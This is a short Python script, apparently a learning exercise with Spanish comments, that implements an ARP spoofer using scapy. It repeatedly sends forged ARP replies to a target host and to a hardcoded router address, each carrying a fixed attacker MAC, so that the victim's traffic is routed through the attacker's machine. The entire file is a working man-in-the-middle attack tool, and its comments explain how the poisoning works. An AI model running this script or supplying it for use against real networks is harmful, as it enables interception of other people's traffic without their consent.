#!/usr/bin/env python3

import argparse, time, signal, sys
import scapy.all as scapy
from termcolor import colored

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", dest="ip_address", required=True, help="Host / IP range to spoof")

    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="00:09:43:8f:34:6a")
    scapy.send(arp_packet, verbose=False)
    # Cuando op=1 quiere decir que lo que estas enviando es una solicitud, cuando es 2 estas enviando una respuesta, que como tal nadie a solicitado
    # psrc es la ip que esta mandando la respuesta, en este caso estamos "engañando" al router que es la maquina victima quien le envia la respuesta
    # pdst es la ip destino ,quien recive el paquete respuesta, en este caso el router
    # hwsrc es nuestra MAC de atacante
    # Lo que estamos haciendo es mandarle un pauqete de respuesta al router, como si fueramos la maquina victima, diciendole "Soy <IP> y esta es mi MAC", haciendo que de ahora en adelante el router nos mande a nosotros todo el trafico de red que la maquina victima solicite al mismo, para posterioemente hacer lo mismo pero al revez, mandarle una respuesta a la maquina victima como si fueramos el router, diciendole "Soy <IP> y mi MAC es esta" haciendo que todo el trafico de red que mande la maquina victima pase por nosotros

def main():
    arguments = get_arguments()

    while True: # El bucle es importante ya que cada poco tiempo se mandan nuevos paquetes para actualizar la tabla ARP
        spoof(arguments.ip_address, "192.168.68.1")
        spoof("192.168.68.1", arguments.ip_address)

        time.sleep(2)

if __name__ == '__main__':
    main()
